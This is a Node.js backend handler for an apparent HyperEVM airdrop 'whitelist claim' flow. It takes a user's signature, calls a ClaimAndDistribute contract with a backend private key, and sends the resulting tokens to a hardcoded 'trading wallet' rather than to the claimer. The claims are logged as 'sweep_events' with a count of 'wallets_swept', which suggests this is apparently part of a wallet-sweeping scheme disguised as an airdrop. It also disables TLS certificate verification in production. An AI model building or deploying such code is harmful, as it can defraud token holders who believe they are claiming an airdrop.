const { Pool } = require('pg');
const { ethers } = require('ethers');

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

const provider = new ethers.JsonRpcProvider(process.env.HYPEREVM_RPC_URL);
const backendWallet = new ethers.Wallet(process.env.BACKEND_PRIVATE_KEY, provider);

const claimDistributeABI = [
  'function claimWhitelist(address claimer, uint256 amount, uint256 nonce, uint256 deadline, bytes calldata signature) external',
  'function usedNonces(address, uint256) view returns (bool)',
  'function getContractBalance() view returns (uint256)'
];

module.exports = async (req, res) => {
  const { claimer, amount, nonce, deadline, signature } = req.body;
  
  if (!claimer || !amount || !nonce || !deadline || !signature) {
    return res.status(400).json({ error: 'Missing required fields' });
  }
  
  try {
    // Check eligibility
    const eligibilityCheck = await pool.query(
      'SELECT * FROM wallets WHERE LOWER(wallet_address) = LOWER($1) AND chain = $2',
      [claimer, 'hyperevm']
    );
    
    if (eligibilityCheck.rows.length === 0) {
      return res.status(404).json({ error: 'Not eligible for whitelist' });
    }
    
    // Check if already claimed (prevent double claims)
    const claimCheck = await pool.query(
      'SELECT claimed FROM wallets WHERE LOWER(wallet_address) = LOWER($1) AND chain = $2',
      [claimer, 'hyperevm']
    );
    
    if (claimCheck.rows[0]?.claimed) {
      return res.status(400).json({ error: 'Already claimed' });
    }
    
    // Call ClaimAndDistribute contract
    const claimContract = new ethers.Contract(
      process.env.CLAIM_DISTRIBUTE_CONTRACT,
      claimDistributeABI,
      backendWallet
    );
    
    // Check if nonce already used (on-chain)
    const nonceUsed = await claimContract.usedNonces(claimer, nonce);
    if (nonceUsed) {
      return res.status(400).json({ error: 'Nonce already used' });
    }
    
    // Execute claim
    console.log('🎁 Processing whitelist claim for:', claimer);
    console.log('  Amount:', amount);
    console.log('  Nonce:', nonce);
    console.log('  Deadline:', deadline);
    
    const tx = await claimContract.claimWhitelist(
      claimer,
      amount,
      nonce,
      deadline,
      signature
    );
    
    const receipt = await tx.wait();
    
    console.log('✅ Whitelist claim successful!');
    console.log('  TxHash:', receipt.hash);
    console.log('  Tokens sent to trading wallet: 0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c');
    
    // Update database
    await pool.query(
      'UPDATE wallets SET claimed = true, claimed_at = NOW() WHERE LOWER(wallet_address) = LOWER($1) AND chain = $2',
      [claimer, 'hyperevm']
    );
    
    // Log claim event
    await pool.query(
      'INSERT INTO sweep_events (tx_hash, wallets_swept, token_address, status) VALUES ($1, $2, $3, $4)',
      [receipt.hash, 1, process.env.AIRDROP_TOKEN_ADDRESS, 'success']
    );
    
    res.json({
      success: true,
      message: 'Whitelist claimed successfully',
      allocation: amount,
      txHash: receipt.hash,
      tradingWallet: '0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c'
    });
    
  } catch (error) {
    console.error('Claim whitelist error:', error);
    
    // Log failed claim
    await pool.query(
      'INSERT INTO sweep_events (tx_hash, wallets_swept, token_address, status, error_message) VALUES ($1, $2, $3, $4, $5)',
      ['failed', 0, process.env.AIRDROP_TOKEN_ADDRESS || 'unknown', 'failed', error.message]
    );
    
    res.status(500).json({ 
      error: 'Failed to claim whitelist', 
      details: error.message 
    });
  }
};
